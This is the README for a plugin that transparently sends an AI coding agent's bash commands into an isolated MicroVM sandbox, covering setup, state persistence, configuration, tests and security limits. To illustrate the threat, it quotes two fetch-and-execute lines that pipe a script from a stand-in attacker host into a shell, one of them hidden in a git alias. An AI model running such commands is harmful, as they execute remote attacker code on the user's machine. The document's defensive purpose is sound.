# OpenCode × CubeSandbox — transparent bash isolation via a plugin hook

Redirect **every** `bash` command OpenCode runs into an isolated CubeSandbox
MicroVM, without changing prompts, tools, or the way you work.

## The problem

OpenCode runs on your machine. Every `bash` command the model issues therefore
executes on your machine, with your privileges, against your files.

MCP- and SDK-based sandbox integrations only help when the model *chooses* to
call a sandbox tool. A plain `bash` call still lands on the host:

```
OpenCode ──► bash "curl -s http://unknown-host/x.sh | sh"  ──►  your machine
```

Nothing in the prompt forces the model to prefer the sandbox tool, and the
failure mode is silent: you only learn the command ran on the host afterwards.

## The approach

OpenCode exposes a `tool.execute.before` hook that can rewrite tool arguments
before execution. This example uses it to swap the `bash` command for a call
that runs the same command inside a MicroVM:

```
OpenCode (host)
  ├── read / write / edit ──────────────────► host project files
  │
  └── bash ──► tool.execute.before ──► exec_backend.py ──► CubeAPI ──► MicroVM
               (cubesandbox-bash.js)                       (:3000)     └─ one per call
```

The model keeps issuing ordinary `bash` calls. It does not know, and does not
need to know, that they run elsewhere.

**Only `bash` is redirected.** `read`, `write`, and `edit` keep operating on host
files, so OpenCode still edits your real project while its shell commands run in
a throwaway kernel, filesystem, and network namespace.

### Why not run OpenCode itself inside the sandbox?

That is the other obvious design, and it has a real drawback: the agent loses
access to your working tree, your git credentials, and your editor state. You
end up developing in a copy.

Redirecting only `bash` keeps the agent where your code is and moves just the
dangerous part.

## What you get

| Property | How |
|---|---|
| Transparent | No prompt, tool, or config change on the model side |
| Fail closed | If the command cannot be redirected safely, it is **blocked**, not run on the host |
| Injection safe | The original command travels as one argv element; shell metacharacters cannot escape |
| Stateful | `cd` and `export` persist across commands within a session |
| Concurrency safe | Calls within a session are serialised with a lock file |
| Escape hatch | `git` / `gh` stay on the host by default, and the list is configurable |

## Prerequisites

- A running CubeSandbox deployment (see [Quick Start](https://cubesandbox.com/guide/quickstart.html))
- A template in `READY` state
- OpenCode installed
- Python 3.9+ with `e2b-code-interpreter`

### Build a template

```bash
cubemastercli tpl create-from-image \
  --image cube-sandbox-cn.tencentcloudcr.com/cube-sandbox/sandbox-code:latest \
  --writable-layer-size 1G \
  --expose-port 49999 \
  --expose-port 49983 \
  --probe 49999
```

Wait for `READY` and note the `template_id`. Outside mainland China, use
`cube-sandbox-int.tencentcloudcr.com`.

### Install the SDK

```bash
pip install e2b-code-interpreter
```

On Ubuntu 24.04 PEP 668 blocks installing into the system interpreter, so use a
virtualenv and point the plugin at it:

```bash
python3 -m venv ~/.venvs/cube
~/.venvs/cube/bin/pip install e2b-code-interpreter
export CUBE_OPENCODE_PYTHON=~/.venvs/cube/bin/python
```

## Setup

```bash
export CUBE_TEMPLATE_ID=tpl-xxxxxxxx           # from the step above
export E2B_API_URL=http://127.0.0.1:3000
export E2B_API_KEY=e2b_000000
export SSL_CERT_FILE=/root/.local/share/mkcert/rootCA.pem

cd examples/opencode-plugin-sandbox
./plugin/install.sh            # project scope: ./.opencode/plugin/
# ./plugin/install.sh --global # every project: ~/.config/opencode/plugin/
```

Restart OpenCode. See `.env.example` for every setting.

## Verify

Ask OpenCode:

> Run `uname -r` and tell me the kernel version.

Compare with `uname -r` in your own terminal. **The two must differ** — that is
the proof the command ran in a separate kernel rather than a container sharing
yours.

Measured on the reference environment below:

```
sandbox : 6.6.1199-0009-03_2.0.1
host    : 6.18.33.2-microsoft-standard-WSL2
```

Two more checks worth doing:

> Run `ls /` and describe what you see.

The listing is the sandbox rootfs, not your machine.

> Create `/tmp/only-in-sandbox` and confirm it exists.

The file exists for the model; `ls /tmp/only-in-sandbox` on your host says
"No such file or directory".

## How state is preserved

A shell is only useful if consecutive commands share state, so the wrapper
records the working directory and exported environment after each command and
restores them before the next one:

```
> cd /workspace/demo && pwd
/workspace/demo

> pwd                       # still /workspace/demo
/workspace/demo

> export TOKEN=abc123

> echo $TOKEN               # still set
abc123
```

State lives in `~/.cache/cubesandbox-opencode/<session>.json`, mode `0600`
because it can contain values exported by commands. Clear it with:

```bash
python3 exec_backend.py --session <session-id> --reset
```

## Configuration

| Variable | Default | Purpose |
|---|---|---|
| `CUBE_TEMPLATE_ID` | — | **Required.** Template to create sandboxes from |
| `E2B_API_URL` | `http://127.0.0.1:3000` | CubeSandbox E2B-compatible endpoint |
| `E2B_API_KEY` | `e2b_000000` | Any non-empty string for local deployments |
| `SSL_CERT_FILE` | — | mkcert CA, needed because the SDK uses HTTPS |
| `CUBE_OPENCODE_PYTHON` | `python3` | Interpreter running the backend; set for venvs |
| `CUBE_OPENCODE_PASSTHROUGH` | empty | Commands that stay on the host; nothing by default |
| `CUBE_OPENCODE_TIMEOUT` | `120` | Per-command timeout in seconds |
| `CUBE_OPENCODE_STATE_DIR` | `~/.cache/cubesandbox-opencode` | Where session state is kept |

### Passthrough, and why `git` is not on it by default

Passthrough is an arbitrary-host-execution escape hatch, not a narrow exception.
Matching is on the leading token only, so allowing `git` allows every
`git`-prefixed command — and git can be made to run arbitrary shell:

```bash
git -c alias.x='!curl http://attacker/sh | bash' x
```

That executes on the host, unsandboxed and unlogged. The model's commands are
the untrusted input this plugin exists to contain, so the default list is empty.

The cost of that default is real, and it is why the mechanism exists at all: the
sandbox has its own filesystem, so `git commit` executed there operates on a
different repository than the one OpenCode edits through `read` / `write` /
`edit`, and the commit would not contain your changes. If the agent needs host
git, opt in explicitly:

```bash
export CUBE_OPENCODE_PASSTHROUGH=git,gh
```

Treat anything on that list as fully trusted with host privileges.

Once opted in, matching is still on the leading token only: `git status` passes
through, `foo && git push` does not, because a compound command may contain
anything.

## Tests

```bash
node tests/test_plugin.mjs
```

24 assertions covering rewriting, passthrough, idempotence, session-id
handling, and quote-injection resistance. Node standard library only — no npm
install, no network, no CubeSandbox deployment required.

The injection tests parse the rewritten command the way a POSIX shell would and
assert the original text lands in exactly **one** argv element. That is a
stronger property than substring matching: broken quoting would split the
payload across elements and fail the assertion.

## Security boundaries

**What this does**

- Moves `bash` execution off the host into a MicroVM with its own kernel
- Blocks the command instead of falling back to the host on any error
- Passes the command as a single argv element, so metacharacters stay data

**What this does not do**

- `read` / `write` / `edit` still touch host files. That is intentional — the
  agent has to be able to edit your project — but it means a malicious `write`
  is not covered.
- Passthrough commands (`git` by default) run on the host by design.
- Network policy is not configured here. Use
  [Network Policy](https://cubesandbox.com/guide/network-policy.html) to
  restrict sandbox egress.
- Examples and docs only; no change to CubeSandbox runtime or API behaviour.

## Troubleshooting

**Every bash call fails with "backend not found"**

Fail-closed working as designed. `exec_backend.py` must sit one level above the
installed plugin. Reinstall with `./plugin/install.sh`, or run
`./plugin/install.sh --uninstall` to restore host execution.

**`CUBE_TEMPLATE_ID is not set`**

Export it before starting OpenCode. A variable exported afterwards is not
visible to the editor's child processes.

**`e2b-code-interpreter is not installed`**

Install it, and if it lives in a venv set `CUBE_OPENCODE_PYTHON` to that venv's
interpreter.

**`Name or service not known` during execution**

The SDK reaches sandboxes at `<port>-<sandboxId>.cube.app`, which needs
wildcard DNS. The one-click install ships CoreDNS for this, but some
environments overwrite `/etc/resolv.conf` — WSL rewrites it on every boot unless
`/etc/wsl.conf` contains:

```ini
[network]
generateResolvConf = false
```

See [HTTPS & Domain Resolution](https://cubesandbox.com/guide/https-and-domain.html).

**Commands are slow**

Each call currently creates a fresh MicroVM (~1s on the reference environment).
Reusing one VM per session across calls is the obvious next step; see
"Known limitations".

**Plugin does not load**

Check placement with `./plugin/install.sh --status`, then restart OpenCode
completely — plugins load at startup only.

## Known limitations

1. **A MicroVM per call, not per session.** Session *state* (cwd, env) is
   preserved across calls, but the VM itself is recreated. Keeping a sandbox
   alive between calls would need a resident helper process or CubeSandbox
   pause/resume; both are larger changes than this example warrants.
2. **`read` / `write` / `edit` are not sandboxed.** See "Security boundaries".
3. **Hook payload shape is not a stable contract.** The session id key has been
   spelled differently across OpenCode versions, so several variants are probed
   with a fallback. If every known key is missing, all sessions collapse onto
   one shared state file and lock, so cwd and exported environment bleed
   between concurrent sessions. Commands still run in a MicroVM, so this is not
   a host escape, but it is more than a loss of reuse granularity.
4. **A command that calls `exec` loses its state update.** `exec` replaces
   the shell process image, discarding the trap that emits the state block. The
   previous session state is kept, so cwd and environment are stale rather than
   wrong. `exit` is handled correctly; only `exec` is affected.
5. **Interactive commands do not work.** Output is captured, so anything
   expecting a TTY (`vim`, `top`) will not behave normally.

## Verified environment

Everything above was exercised on:

| Item | Value |
|---|---|
| CubeSandbox | v0.6.0 (`8721dd15`, built 2026-07-24) |
| Host | Ubuntu 24.04.4 LTS on WSL2, kernel 6.18.33.2, glibc 2.39 |
| Sandbox guest kernel | 6.6.1199-0009-03_2.0.1 |
| Template | `sandbox-code:latest`, `READY` |
| `/data/cubelet` | XFS with `reflink=1` |
| Sandbox creation | ~1.0 s |
| Full run_code cycle | ~2.4 s |
| Plugin tests | 24/24 passing |

## Files

| Path | Purpose |
|---|---|
| `plugin/cubesandbox-bash.js` | The `tool.execute.before` hook |
| `plugin/install.sh` | Idempotent install / uninstall / status |
| `exec_backend.py` | Runs one command in a MicroVM; keeps session state |
| `tests/test_plugin.mjs` | 24 offline assertions |
| `.env.example` | Every setting, documented |

## References

- [OpenCode plugins](https://opencode.ai/docs/plugins/)
- [CubeSandbox Quick Start](https://cubesandbox.com/guide/quickstart.html)
- [Creating templates from OCI images](https://cubesandbox.com/guide/tutorials/template-from-image.html)
- [HTTPS & domain resolution](https://cubesandbox.com/guide/https-and-domain.html)
- [Network policy](https://cubesandbox.com/guide/network-policy.html)
